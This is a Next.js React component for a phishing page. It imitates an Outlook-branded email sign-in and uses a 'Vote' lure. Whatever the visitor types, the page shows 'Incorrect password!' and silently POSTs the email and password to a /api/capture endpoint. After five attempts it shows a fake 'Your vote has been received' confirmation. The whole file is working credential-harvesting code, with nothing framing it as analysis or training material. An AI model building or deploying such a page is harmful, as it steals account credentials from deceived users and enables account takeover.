import Head from 'next/head';
import { useState, useRef } from 'react';

const MAX_ATTEMPTS = 5;

export default function EmailLoginPage() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [passcode, setPasscode] = useState('');
  const [feedback, setFeedback] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const attemptRef = useRef(0);

  const handleContinue = () => {
    if (!email.trim()) {
      setFeedback('Please enter a valid email address.');
      return;
    }
    setFeedback('');
    setStep(2);
  };

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    attemptRef.current += 1;
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: email.trim(),
          password: passcode,
          method: 'email'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    }
  };

  const handleBack = () => {
    setStep(1);
    setFeedback('');
    setPasscode('');
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Sign in - Vote</title>
      </Head>

      <style jsx>{`
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f2f2f2; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; overflow-x: hidden; }
        .main-wrapper { background: white; width: 100%; max-width: 400px; padding: 24px 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .logo { width: 60px; height: 60px; margin: 0 auto 20px; }
        input { width: 100%; padding: 12px 16px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; }
        input:focus { outline: none; border-color: #0078d4; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #005a9e; }
        .feedback { color: red; font-size: 14px; margin: 8px 0; text-align: center; }
        a { color: #0078d4; text-decoration: none; font-size: 14px; display: block; margin-top: 12px; }
        .footer { margin-top: 34px; padding-top: 16px; border-top: 1px solid #ccc; font-size: 13px; color: #666; text-align: center; }
        .success-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); display: none; align-items: center; justify-content: center; z-index: 9999; }
        .success-overlay.show { display: flex; }
        .success-box { text-align: center; padding: 20px; }
        .checkmark { width: 110px; height: 110px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 28px; box-shadow: 0 4px 12px rgba(76,175,80,0.4); }
        .checkmark svg { width: 56px; height: 56px; }
        @media (max-width: 480px) { .main-wrapper { padding: 20px; } }
      `}</style>

      <div className="main-wrapper">
        {step === 1 ? (
          <div>
            <img className="logo" src="/logos/outlook-logo.svg" alt="Email" />
            <h2 style={{fontSize: '20px', fontWeight: 700, marginBottom: '8px'}}>Sign in</h2>
            <input 
              type="email" 
              placeholder="Enter your email" 
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleContinue()}
            />
            <div className="feedback">{feedback}</div>
            <button onClick={handleContinue}>Next</button>
            <a href="#">Don't have an account? Sign up</a>
          </div>
        ) : (
          <div>
            <h2 style={{fontSize: '20px', fontWeight: 700, marginBottom: '8px'}}>Enter your passcode</h2>
            <input
              type="password"
              placeholder="Passcode"
              value={passcode}
              onChange={(e) => setPasscode(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
            />
            <div className="feedback">{feedback}</div>
            <button onClick={handleLogin}>Sign In</button>
            <a href="#" onClick={handleBack}>← Back</a>
            <a href="#">Forgot passcode?</a>
          </div>
        )}
        
        <div className="footer">
          <a href="#">Terms of use</a>
          <a href="#">Privacy &amp; cookies</a>
          <a href="#">...</a>
        </div>
      </div>

      <div className="success-overlay" id="successOverlay">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}